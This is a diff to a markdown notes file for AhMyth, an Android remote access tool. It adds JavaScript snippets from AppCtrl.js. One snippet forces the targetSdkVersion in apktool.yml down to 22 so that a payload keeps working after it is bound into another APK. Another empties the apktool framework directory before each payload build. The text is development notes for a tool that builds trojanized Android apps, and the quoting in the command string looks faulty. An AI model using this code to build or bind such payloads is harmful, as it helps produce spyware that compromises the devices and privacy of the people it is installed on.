@@ -1,17 +1,43 @@
+# Sdk change for `Apktool.yml`
+This code snippet is responsible for automatically changing the `apktool.yml` file's sdk version to `22`
+in order for the payload to work after binding.
+- AppCtrl.js
+```js
+fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
+    if (error) {
+        console.log("Failed Reading!");
+        return;
+    }
+
+    var regex = /\b(targetSdkVersion:\s*')\d{1,2}'/g;
+    var replace = data.replace(regex, "$122'");
+    
+    fs.writeFile(path.join(apkFolder, 'apktool.yml'), replace, 'utf8', (error) => {
+        if (error) {
+            console.log("Failed Reading!");
+            return;
+        }
+
+    });
+```
 # Function to Empty the Apktool Framework Directory
 This Code will reduce building failed errors with both Standalone APK payloads and Bound APK Payloads, it empties the apktool framework directory before building any payload everytime
 ```js
 
-try {
-    exec('java -jar ' + '" CONSTANTS.apktoolJar "' + ' empty-framework-dir', (error, stderr, stdout) => {
-        if (error) {
-           throw error;
-           return; 	    
-        }    
-    });
-} catch (error) {
-    // Building function here
-}
+        // empty the framework directory
+        try {
+          $appCtrl.Log("Emptying the Apktool Framework Directory")
+          $appCtrl.Log();
+          exec('java -jar ' + CONSTANTS.apktoolJar + '" empty-framework-directory "', (error, stderr, stdout) => {
+            if (error) {
+              throw error;
+            };
+          });
+        } catch (error) {
+          // ignore the error by doing nothing!
+        }
+
+        // Build the AhMyth Payload APK
 ```
 
 # New Cross platform Bind on Launch function
